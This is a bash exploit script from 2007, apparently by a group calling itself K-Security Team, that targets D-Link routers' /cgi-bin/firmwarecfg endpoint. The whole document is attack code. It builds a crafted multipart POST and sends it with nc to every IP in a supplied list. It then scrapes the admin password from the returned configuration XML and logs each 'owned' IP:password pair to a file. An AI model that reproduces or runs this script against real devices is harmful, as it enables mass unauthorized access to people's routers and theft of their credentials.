# !/bin/bash
# Coded Bt Ph3mt Of K-Security Team
# This Code is private, pls do not redistribute
# Release Date 25/11/2007
# Code

function dow {
echo 'POST /cgi-bin/firmwarecfg HTTP/1.1' >> richiesta
echo 'Host: $IP' >> richiesta
echo 'User-Agent: veryprivateacsor' >> richiesta
echo 'Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5' >> richiesta
echo 'Accept-Language: en-us,en;q=0.5' >> richiesta
echo 'Accept-Encoding: gzip,deflate' >> richiesta
echo 'Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7' >> richiesta
echo 'Keep-Alive: 300' >> richiesta
echo 'Connection: keep-alive' >> richiesta
echo 'Content-Type: multipart/form-data; ' >> richiesta
echo 'boundary=---------------------------41184676334' >> richiesta
echo 'Content-Length: 234' >> richiesta
echo '' >> richiesta
echo '-----------------------------41184676334' >> richiesta
echo 'Content-Disposition: form-data; name="config.x"' >> richiesta
echo '' >> richiesta
echo '' >> richiesta
echo '-----------------------------41184676334' >> richiesta
echo 'Content-Disposition: form-data; name="config.y"' >> richiesta
echo '' >> richiesta
echo '' >> richiesta
echo '-----------------------------41184676334--' >> richiesta
echo ' ' >> richiesta
}

function req {
cat richiesta | nc $IP 80 -w 5 | grep password > $IP.config.xml
clean="`awk -F '<' '{print $54 }' $IP.config.xml | cut -d '>' -f2 | cut -d ' ' -f1`"
        if [ `wc -c $IP.config.xml | cut -c1` != 0 ]; then
        echo -e "\033[1;32m 0wn3d ;] \033[1;37m $IP:$clean \033[0m"
        echo $IP:$clean >> 0wNz
        rm $IP.config.xml
        else echo -e "\033[1;31m $IP Patchato... \033[0m"
        rm $IP.config.xml
fi
}

function logo {
echo -e "\033[1;37m*************************************************************************"
echo -e "\033[1;34m|    |/ _|          /   _____/ ____   ____  __ _________|__|/  |_ ___.__.\033[0m"
echo -e "\033[1;34m|      <    ______  \_____  \_/ __ \_/ ___\|  |  \_  __ \  \   __<   |  |\033[0m"
echo -e "\033[1;34m|    |  \  /_____/  /        \  ___/\  \___|  |  /|  | \/  ||  |  \___  |\033[0m"
echo -e "\033[1;34m|____|__ \         /_______  /\___  >\___  >____/ |__|  |__||__|  / ____|\033[0m"
echo -e "\033[1;34m       \/                 \/     \/     \/                       \/     \033[0m"
echo -e "\033[1;37m*************************************************************************"
echo ""
echo "D-Link Config Reset Exploit By Ph3mt Avviato ;] Attendi..."
}

if [ -z "$1" ]; then
echo -e "\033[1;37m*************************************************************************"
echo -e "\033[1;34m|    |/ _|          /   _____/ ____   ____  __ _________|__|/  |_ ___.__.\033[0m"
echo -e "\033[1;34m|      <    ______  \_____  \_/ __ \_/ ___\|  |  \_  __ \  \   __<   |  |\033[0m"
echo -e "\033[1;34m|    |  \  /_____/  /        \  ___/\  \___|  |  /|  | \/  ||  |  \___  |\033[0m"
echo -e "\033[1;34m|____|__ \         /_______  /\___  >\___  >____/ |__|  |__||__|  / ____|\033[0m"
echo -e "\033[1;34m       \/                 \/     \/     \/                       \/     \033[0m"
echo -e "\033[1;37m*************************************************************************"
echo ""
echo "D-Link Config Reset Exploit By Ph3mt ;]"
echo "Usage ./dlink <Lista|Ip>"
else

logo
for LINE in `cat $1`; do IP=`echo $LINE |cut -d ":" -f1`; dow; req; rm richiesta; done

fi

